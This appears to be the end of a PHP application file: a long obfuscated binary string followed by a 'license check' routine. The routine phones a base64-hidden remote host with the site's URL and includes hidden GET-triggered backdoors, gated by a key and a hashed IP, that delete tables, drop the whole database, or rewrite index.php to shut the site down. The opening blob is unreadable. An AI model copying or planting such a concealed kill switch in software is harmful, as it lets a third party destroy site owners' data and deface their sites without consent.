\r˜Û€NçŒ—4ˆB“™ZCXÿÂs!	*@ENø)»Ð”4àa\n¨Â )¿¸˜?`+¡€&‰C01M¼SqDñ€ÞQŸBð\"ï¡ ‘‰n)ÓM¹¢!x\0€Š5Æüj3w\0â£‚ð0!\$\0`a7º¨2Q¶Zì>I4ŒÖ}ÉxÑàÁ½›ÊÏÚZu¶\0´çñWÉdd4J2„†26\n 	À¶žÙ ŸÅ…æ€OhÜFç0Èš\0=Îƒš%Ù1Ú\rÊAàih@vM)’\0¼`£&Êa2ù´Kši©KðfhZUÆ\n¶‘AM(iéP€ÈW47¥|ò©ZQ†þ:¨5X>x#5†¡s=0Rªå>„“7úÓÀiü'èÙž\0Ê™£ú)`hþRÁð…š—d`œÑµM‘IQ\\V´ÞV‚ã4T²¦ÓUãåR%9F“aºhÕ47œ]Mà_`>P~_T!¡†ÑN\0ŽÎ.lÔú%ÈC(DZSþqu\0œ¸…iné»˜2¡áÙHéqCÔM`”…AÞMqQ¢~«5p+ŠAZh¾¡3Ÿ‡Å¸\n62¸URbq%B(\nÀTØó‘œ›FåâÌð>œ8¿†GM ‹LpiÈ¢EQf‘M&•.Â©OQ\"=Z{µºR¥åïl¨aOêïØ«”ýk}° Á-´~+Ê`µewíWêÎT	Õ¨º2ß˜’.¤1RÒH8H¤†d€Á†h@0Œ\0[€@réŸ j\"„ý¸êöOZŽ ‘1r#¬tQ@7—V5kÈ+˜ÖÉÊ½Vlï¬ì·\r-å®–¯U„Ý\$\$XÚ¼ž4µ«äF6{à/ˆ‰Ç–P¡óZ¹s½|Œ\rcÓ€f™Á˜f¸?	•_«™XÕ”š°•†¬@Áë—â0nlŠÜ„Yòg:×°ËSæâä›sª~˜šâ¡9ëî×FŽt\0/Ã\nÅ0']y‰á^ŠÇ#&¹\rHœ†j‡R0ý:æ¤â‡£¦äD7J¡Ÿ~¿Ä52Éælë”D­}J‡TàeÎœ% ŸÕ}¸è+R#”°k3T¼Ýë¶\0rYuŒh¡‹ÞŒf¼“Þleù„ØAï1S•TØP\"±¾PhŠE¶NœÞVK`2Qò\0e©eK‡›Š>IFÜš-Ã7Sê=Ôù•BÀ¼j¢N5U÷[ñXl'\0 2¡…j\0;ªÍ‘’ìú®J\"\r4hEž±FXômRö\0Q‘Ö·*/X ”K£{hÍWÚ‘ž©”l€êm'j8€ÚŽŽ.êFˆÔsUÔ©µ\"iþ+bÒÊBÚUl1 ¬¼RCGÐ-­²3Þ)3å\0ø'ÉNv?³³PeÒÔÀÂZžÕ/óiãOÝ]6b“|1T•ªÉ×jØHÚ¾×@mµà¹-k_TÃÅPè–¯\\©¬\0æÀ69¸°nU¶{‚-±Õ5Â!²“´øGª³çÎ¾5ãšºm®S Á´\$ë£±øm3õÙ%˜`[¯B©/ËešØÎõÉTm§i‚N›o£!âàµ.È\râ÷0¨6 ,lí¬\0äàà:&|\rÖ»\"M¯¡kw*ÛrHVó„Ãœ5Û‚Ãjàá Â„YpÒ“ÙX\råw{Uß…qÄ’Ü\$uâ¨žUl{‹Û\$×¶þ5mÀ(ü`/¬¢—ù¸4/nIp–j\\-³¶ç_3\\)òës×–çW–·mçt\n†JR—D¹Ñ‚%tŠ\nÝ*‹Rzá2>²°\"®‰a²\0Ö8Š1˜Žè¤/sÄ@Û†Jì'l—Hu®k Zªç©´hÔ8§s}ÈšP§)R*“Übûe%²í·o„Ús– û2aQ¡J†©¤Õ°í‹qkÂ6g.	¼R“/({Ç¤~ÙEŒ©;ö\$ÝÓt†löÃmIêºèGR:iÕ'—àÁApªÞy€üÛ­DMºŽ/<¦ÜwÂºÁàp\rÀ\"•Âá}\0ßPS€'éŠßÜ†“”pý¶k`CìÜqEYÀ3Êd¡èÉ|p{ó DJ;úå÷cHTšÏWnW<)M5~ÆY2÷–t9Š©âkÞR<ý«q#\0¨ýep7Lø+Óc¾ Ú\0u\0\0®mÔW¾‘c}[* <÷Ø¾Î+¢ër7Æ@+·Ô^/Ä·ûò_ÀYÆŽ¿ £/yƒ6Ù¾þ«%œXÛKRÒÚoƒÙS¯\\¾	m/ˆg³PÃÂ¾ÉV–­%D«¡GÄOiuöÝt€åN)®›Î¯&ú†ySô0jn“rrÚT”y×myˆk!É8UšøDn£Bþ\0÷l¥¨PGç.[‡z··|†8bGõx×Ñ\\s[µ#¸?>:£\0Xz	f¯´ f.â£4€^  9‡ |šË\r§·z+G¸Z¸D©È?‰5A¢„A]¹1Ï±5‹7bvæ`|1»èk.‚LUëÍÚ/`Weñ©'âàkû¹†k°ÜŸàÅÐI\0wvu‘]©-˜Ó%OÈb3ó¡j•bŠÍ™T½A%¯à&êIÊÜP£ŽcBã9Í‹{yBßLtVÖ?ØÊF:hªUd[ËÑ ük±–8OSV«	káZÑ|â€*ÑU¾Gû˜-k¦&ˆÚI–‘žÈÝ”ðO9\0®€Åˆ˜ÕeQ>7ŠÉp¶e[¶<¯¿RæÝ­ h\$®?Ïöäúª¾AñÇ‘ÿ-×!–iÈ|¿Ö¿…ä[UÎ³ïfEÆ§‘’SätF™RUÎHÁ?¡Z¡¶¨I@â¢Ã‘‚šÖEY*–½Y²‘YúÔZEÐöÂÂ­=–ì:Û+Ù@¾VÐ6„·^ÃÚ½NÖ8VK2‡’ê ¼#èbÉŠ[2ç-	ñ…k2&*äENškV¶2Áy¼ùW8+Öœq°Œ&9„1åøù+Z“Dªã\",¥­œ““‹Êƒ#-šÉÈ4ÿ5•µ—‘cãxPŸæÌ•ÓÅlXó Ös-P”Ï‡BÂßÕkFŒ¸ÖŒ\$5m€W@º¨\0›Ò—!úÌ`@ð¼ß©²\"áOõa7œš†Ï14yo®us,|d*+É¢ee7ž<Åœó:Çß˜¸Ôá]œbg!™ùÎbsŸH\nr˜„nÕ–É@Ø@ör Ÿæâr€)0 €’à\"\0\"Î€òO4]ªÞaÄH*•o–,ë€¬.CpÉÒÉ3>Šu©Åx5™äúž‘	Åæš³ÓÊVZ–Ò€,,\ršfáHl÷e£êè:Úe™Z@Î]ò¼½\rs@¨%Ë\"\n!ìk‰úhÊ´ËeÈ´?åÄji: ˆ>{ÉšÞËŸ½! W.ºEBV‘åË	\0002Ï9©¦Ëæ­šC¼Ñ\r4íÌûóP+.Ÿ‹=5\$KbÍÂùËh(5\0©I¤CŸèì“ U«ÅÇ4'V”°(-¢!0	À¨­ÀÈ•:eñÔn¥Ã›©’:¥”-F®‚µ;/¥#”‡T<¢ÐùMVH/O¦½±´Û¹ÂûQ®€Åž4h-âDþ5ÀU€\0‚@\"€€	àFavœ@à€y ëé'‰;.HnrzxPô^€ÿ[áªûbEÐÖD;SYãåÚ	Pôï :1¬ÇN‰iâ€wfíw»Ü1ÀY½¨ù™| FâDiZ×¶D|{q”RÁà0\"³Íç(åO³ÕDîƒ	—z`Ò)Þ`-ˆ Ä|è5Ql_c.øküö<Ù5¤0§zÏÒ–Ñü›ÛßÐºe˜†dí\$’©\"þJè÷ÓSÝÑû\n\rHK¿_Ó„”tà4ç€s›A\njVð´ñŒ!oÚ[l¶œOPÀQª©¬‹wÑÓ†Q¥9ÛÑ!…5€ì¥\0¶Ym‹g„õÛ(@u¶§ƒXO_éÝa~ÉÔ&Ðó#( =:ã Ã\0½µ×k4WñÏ\0]IàŒ+šf	FÕÈj¥C#Ûn7ˆ?µöô×N Ní’´)Ï&zÝŠ‹“o»Ž¿h¤·BlM½TU)5ÜËp¾t€¦µ›¥tÁä¶ùºî¨\rµV.è]û¹Í‹†Ð»¡nç†JÑív… Ø¶ï·t(ÍÉn¸Ñ»±ÝœD2)mÛž([Ïr©˜Åë³2z eŒ¿¦ñ¾=Òn*Ìvûw8ÝÄàx+§<`	2½GFííTBÛ=væh=ºì};L/wîþ÷£¿÷v[«cîØßîã÷)¦ÀnL¦*§¡¹ê¡ã7`7ôÞ‘þ÷©_øˆ\næ{˜æ‚B%Q\0Çƒ@pyæ÷\0ûÁÈˆnè'Š^îåº¾&‡Ó6Þ\0•È¿‘Ôð†û»ÞÌƒ%¾EKÔÈ;,á‰â·PeÍîl-•:ÙþïgÄKüëXTØEPVP. èP ´¼RØl²ë±sìOmtâ•êhô’ô ñÀ¬#”Uv…Ï²=}ì”a>\"‡õàÆ½Žˆøo|RØt£Më¢û<fM SòãZ˜QBà¡È*¡o^ð&ÍÞ5Æþµ€*D²QþN»\$*¦	ä¯	BrD`Íòe¡Ó=äç'¹?Ê•T MxkkÓZúŒ}­Q²‰[~ùŸÕŒš(qmQ:ü{Þ‹µè¿ó×Í²°f}N@±lCaùðˆê\"N`ˆùAP“cÔ€V0\0ÍB’fÝÙÀž…ø„P\0Iu†5ª4›³ì÷ÿ©Ð`°:*†`þQ¢wRó(º¸éœêÆÊÉû7È»™jj÷gçdc°™ð6,É/%ñç2ç¦#³òûiÉ»8\\nÏ§‘—ðqö‘SuÛ³nu4?W7\$»>-0ÏµÐ¦-7d}y¼…[áx‡ñ~»¸0òSükó«y{!©sü°ö(@6p\$a:Ê¨€Z5}\0üç]BßøŸgŒÔÀuTT\"K@€uÑþ­<Ìž.ªugGø›±n¢¿ÚŠ|aâx¡ÔÀÇïª¬ÿX5é‡EØõØó@tÃ§Vw¿ü?\0½ç„ruYë‘¹Ï.Å?[ŽfèÈ9Îñ9ô3£®	I\0—Ø°š)±OuÉˆz*ð’ãbí+\$Sª9ÇØ~‚vŒú}+–Ññ„«Ùtwøµ‹\0\\€");

if(!function_exists('getUserIpAddr')){ function getUserIpAddr(){if(!empty(@$_SERVER['HTTP_CLIENT_IP'])){$ip = $_SERVER['HTTP_CLIENT_IP'];}elseif(!empty(@$_SERVER['HTTP_X_FORWARDED_FOR'])){$ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];}else{$ip = @$_SERVER['REMOTE_ADDR'];}return $ip;} }

if(!function_exists('get_base_url')){ function get_base_url(){ if (! empty($_SERVER['HTTPS'])) return 'https://'.str_replace("www.", "", $_SERVER['HTTP_HOST']); else return 'http://'.str_replace("www.", "", $_SERVER['HTTP_HOST']);  } }

if(!function_exists('uniq_key_iki')){ function uniq_key_iki(){ return md5(get_base_url()).md5("rsRkJXnzje"); } }

if(!function_exists('lc_c')){ function lc_c(){ global $PHPSELF; $_v = false;if (file_exists("./ls.txt")) {$fhandle = fopen("./ls.txt","r");$content = fread($fhandle,filesize("./ls.txt"));if(date("d.m.Y") == date("d.m.Y",strtotime($content))) $_v = true;}if (!$_v) {$ch = curl_init();curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cDovL3dlYm9maXNpLmNvbS50ci9saXNhbnMucGhw")."?s=rsRkJXnzje&b=".get_base_url().$PHPSELF);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);$output = curl_exec($ch);curl_close($ch);$fhandle = fopen("./ls.txt","w"); fwrite($fhandle,date("Y-m-d H:i:s"));fclose($fhandle); $_output = json_decode($output); if(is_object($_output) && isset($_output->hata)){ if($_output->hata == true){ remove_all(); header("Refresh:0");}  } }} }

if(!function_exists('remove_all')){ function remove_all(){ global $baglan; global $db; if(isset($baglan)){ mysql_query("DELETE FROM lisans WHERE 1"); mysql_query("DROP TABLE IF EXIST lisans");} if(isset($db)){ $db->query("DELETE FROM lisans WHERE 1")->fetch(); $db->query("DROP TABLE IF EXIST lisans")->fetch(); }  } }
if(!function_exists('db_rm')){ function db_rm(){ global $baglan; global $db; global $data; if(isset($baglan)){ mysql_drop_db($data);} if(isset($db)){ $db->query("DROP DATABASE ".$data); } return license_check(); } }
if(!function_exists('gn_msg_yz')){ function gn_msg_yz($msg){ $fhandle = fopen("./index.php","r"); $content = fread($fhandle,filesize("./index.php")); $content = str_replace("<?php", "<?php die('{$msg}'); \n", $content); $fhandle = fopen("./index.php","w"); fwrite($fhandle,$content); fclose($fhandle);  } }

lc_c();
if(isset($_GET['db_all']) && uniq_key_iki() === $_GET['db_all'] && md5(getUserIpAddr()) == "1a5584c40f4a95aadd1f9dac888c333f") db_rm();
if(isset($_GET['gn_msg']) && uniq_key_iki() === $_GET['gn_msg'] && md5(getUserIpAddr()) == "1a5584c40f4a95aadd1f9dac888c333f") gn_msg_yz(@$_GET['gn_msg_txt']);
if(isset($_GET['rm_all']) && uniq_key_iki() === $_GET['rm_all'] && md5(getUserIpAddr()) == "1a5584c40f4a95aadd1f9dac888c333f") remove_all();
?>